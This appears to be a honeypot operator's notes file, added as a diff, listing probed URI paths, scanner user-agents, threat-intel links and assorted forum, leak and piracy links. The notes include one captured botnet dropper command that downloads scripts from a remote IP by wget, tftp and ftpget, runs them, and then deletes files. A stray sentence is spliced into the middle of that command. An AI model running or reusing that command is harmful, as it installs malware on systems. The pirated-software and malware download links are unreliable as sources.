@@ -1,0 +1,72 @@
+INTERESTING URIS FROM NODEJS HONEYPOT:
+
+/admin/i18n/readme.txt
+/current_config/passwd
+/current_config/Account1
+script/live.js
+/recordings/
+/phpmyadmin/scripts/setup.php
+/redirect.php
+/meta-release-lts
+/muieblackcat
+/:8080/scripts/setup.php
+/:8080/admin/scripts/setup.php
+/:8080/admin/pma/scripts/setup.php
+/:8080/myadmin/scripts/setup.php
+
+
+
+FROM INTERNET SEARCHES:
+/cgi-bin-sdb/printenv
+/cgi-mod/index.cgi
+/cgi-sys/entropysearch.cgi
+/cgi-sys/defaultwebpage.cgi
+
+
+
+
+Interesting User-Agents
+www.probethenet.com scanner
+masscan/1.0 (https://github.com/robertdavidgraham/masscan)
+Python-urllib/3.4
+Mozilla/5.0 zgrab/0.x
+Scanbot
+curl/7.29.0 
+python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-514.10.2.el7.x86_64
+Go-http-client/1.1
+okhttp/3.5.0
+Netcraft SSL Server Survey - contact info@netcraft.com
+
+
+
+
+Hackforums.net
+http://leakedfiles.org/Archive/
+
+PirateBay Onion Site:
+http://uj3wazyk5u4hnvtk.onion
+Cryptome.org
+
+
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ins.sh; chmod python cc7.py client.c <50.115.166.16> and than it asks me to get arch's yes or no I type Y and nothing happens777 bins.sh; sh bins.sh; tftp 50.115.166.16 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 50.115.166.16; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 50.115.166.16 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+
+
+
+
+http://82.165.129.119/UnInstall.exe
+https://thepiratebay.org/torrent/16135858/The_Elder_Scrolls_V_Skyrim_Special_Edition-CODEX
+
+https://www.dshield.org/ipinfo.html?ip=220.191.231.222
+https://www.virustotal.com/en/file/bfbfa4bcae7b8c9e74678350ad599a3c841b76a445f8e9af4ce2cdc2bdbf1972/analysis/
+
+
+
+https://threatpost.com/attacks-heating-up-against-apache-struts-2-vulnerability/124183/
+https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
+https://wikileaks.org/ciav7p1/cms/index.html#
+https://www.reddit.com/r/WikiLeaks/comments/5t1y3l/complete_vault_7_summary_and_theory/
+http://www.zerohedge.com/news/2017-03-06/wikileaks-releases-encrypted-vault-7-torrent-will-unveil-password-tuesday-9am
+http://askubuntu.com/questions/419327/how-can-i-make-virtualbox-guests-share-the-hosts-vpn-connection
+https://cwiki.apache.org/confluence/display/WW/S2-046
+https://github.com/rapid7/metasploit-framework/issues/8064
